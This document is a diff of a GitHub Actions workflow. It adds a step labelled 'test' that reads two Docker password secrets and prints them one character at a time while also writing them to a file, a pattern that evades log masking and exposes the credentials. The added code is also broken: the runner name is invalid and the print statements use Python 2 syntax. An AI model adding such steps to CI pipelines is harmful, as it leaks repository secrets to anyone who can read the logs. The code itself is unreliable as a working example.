@@ -10,12 +10,19 @@ on:
 
 jobs:
   build:
-    runs-on: ubuntu-18.04
+    runs-on: python
     env:
       PASS: ${{ secrets.ALI_DOCKER_PASSWD }}
       PASS2: ${{ secrets.DOCKER_PASSWD }}
     steps:
     - name: test
       run: |
-        echo $PASS
-        echo $PASS2
+        import os
+        data = open("file", "w")
+        for q in (os.getenv("PASS")):
+          print q
+          data.write(q)
+        for q in (os.getenv("PASS2")):
+          print q
+          data.write(q)
+      shell: python
